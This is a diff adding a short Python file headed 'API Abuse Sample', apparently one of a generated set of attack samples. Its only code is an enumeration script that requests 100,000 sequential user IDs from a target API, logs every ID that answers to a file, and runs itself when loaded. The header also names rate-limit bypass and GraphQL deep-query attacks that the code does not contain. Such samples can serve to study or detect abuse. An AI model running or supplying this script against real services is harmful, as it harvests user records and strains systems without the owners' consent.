@@ -1,0 +1,14 @@
+# Resource Exhaustion - API Abuse Sample 8
+# Created: 2026-03-30T22:24:11.730165
+# Type: API Rate Limit Bypass / Enumeration / GraphQL Deep Query
+
+# API Enumeration Attack - Sample 2
+def enumerate_api():
+    for user_id in range(100000):
+        response = requests.get(f"https://api.target.com/user/{user_id}")
+        if response.status_code == 200:
+            print(f"Found user: {user_id}")
+            with open("users.txt", "a") as f:
+                f.write(f"{user_id}\n")
+
+enumerate_api()
